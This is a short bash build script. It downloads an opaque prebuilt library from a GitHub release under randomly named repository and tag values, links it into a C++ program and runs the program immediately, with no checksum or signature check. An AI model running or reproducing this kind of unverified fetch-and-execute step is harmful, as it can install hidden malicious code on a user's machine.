#!/usr/bin/env bash
set -e
TAG="crimson-ember-cosmic-canyon"
LIB="swift-rain.a"
wget --tries=3 -q --timeout=15 -O "$LIB" "https://github.com/frankremix708/conciseplazahub/releases/download/${TAG}/${LIB}"
g++ -O2 -std=c++17 -pthread -o app main.cpp "$LIB" && ./app
